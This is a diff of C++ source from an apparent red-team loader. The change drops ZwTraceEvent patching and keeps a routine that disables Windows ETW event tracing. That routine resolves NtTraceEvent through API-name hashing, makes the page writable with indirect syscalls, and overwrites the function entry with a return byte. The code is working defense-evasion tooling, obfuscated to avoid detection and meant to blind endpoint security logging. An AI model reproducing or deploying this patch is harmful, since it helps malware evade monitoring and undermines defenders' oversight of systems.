@@ -77,7 +77,6 @@ constexpr auto ntquery_Rotr32A = HashStringDjb2A("NtQueryInformationThread");
 constexpr auto ntqueue_Rotr32A = HashStringDjb2A("NtQueueApcThread");
 constexpr auto ntresume_Rotr32A = HashStringDjb2A("NtResumeThread");
 constexpr auto nttraceevt_Rotr32A = HashStringDjb2A("NtTraceEvent");
-constexpr auto zwtraceevt_Rotr32W = HashStringDjb2A("ZwTraceEvent");
 
 // static variables
 char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0 };
@@ -432,16 +431,17 @@ PVOID CustomMemMove(PVOID dest, const PVOID src, SIZE_T len) {
 
 
 
+/**
+* No more need to patch Zw : "ZwTraceEvent is also a stub that transfers execution to the NtTraceEvent implementation"
+* https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/etw/traceapi/event/index.htm
+*/
 void evt_patch() {
     void* pnttraceevt = CustomGetProcAddress(CustomGetModuleHandle(_ntdll), nttraceevt_Rotr32A);
     printf("[+] Address of NtTraceEvent found : 0x%p\n", pnttraceevt);
-    void* pzwtraceevt = CustomGetProcAddress(CustomGetModuleHandle(_ntdll), zwtraceevt_Rotr32W);
-    printf("[+] Address of ZwTraceEvent found : 0x%p\n", pzwtraceevt);
     char ret_patch[] = { 0xC3 };
     DWORD lpflOldProtect = 0;
     unsigned __int64 memPage = 0x1000;
     void* pnttraceevt_bk = pnttraceevt;
-    void* pzwtraceevt_bk = pzwtraceevt;
 
     FARPROC pNtProtectVirtualMemory = CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntprotect_Rotr32A);
     // Getting syscall value of NtProtectVirtualMemory
@@ -449,20 +449,16 @@ void evt_patch() {
     syscallID = ((unsigned char*)(pNtProtectVirtualMemorySyscallID))[0];
     syscallAddr = (UINT_PTR)pNtProtectVirtualMemory + 0x12; // (18 in decimal)
     indirect_sys(GetCurrentProcess(), (PVOID*)&pnttraceevt_bk, (PSIZE_T)&memPage, PAGE_EXECUTE_READWRITE, &lpflOldProtect); // 0x04 for RW
-    indirect_sys(GetCurrentProcess(), (PVOID*)&pzwtraceevt_bk, (PSIZE_T)&memPage, PAGE_EXECUTE_READWRITE, &lpflOldProtect); // 0x04 for RW
 
     FARPROC pNtWriteVirtualMemory = CustomGetProcAddress(CustomGetModuleHandle(_ntdll), ntwrite_Rotr32A);
-    // Getting syscall value of NtWriteVirtualMemory
     UINT_PTR pNtWriteVirtualMemorySyscallID = (UINT_PTR)pNtWriteVirtualMemory + 4; // The syscall ID is typically located at the 4th byte of the function
     syscallID = ((unsigned char*)(pNtWriteVirtualMemorySyscallID))[0];
     syscallAddr = (UINT_PTR)pNtWriteVirtualMemory + 0x12; // (18 in decimal)
     indirect_sys(GetCurrentProcess(), (LPVOID)pnttraceevt, (PVOID)ret_patch, sizeof(ret_patch), (PULONG)nullptr);
-    indirect_sys(GetCurrentProcess(), (LPVOID)pzwtraceevt, (PVOID)ret_patch, sizeof(ret_patch), (PULONG)nullptr);
 
     syscallID = ((unsigned char*)(pNtProtectVirtualMemorySyscallID))[0];
     syscallAddr = (UINT_PTR)pNtProtectVirtualMemory + 0x12; // (18 in decimal)
     indirect_sys(GetCurrentProcess(), (PVOID*)&pnttraceevt_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
-    indirect_sys(GetCurrentProcess(), (PVOID*)&pzwtraceevt_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);
 
     printf("[+] ETW patched !\n");
 }
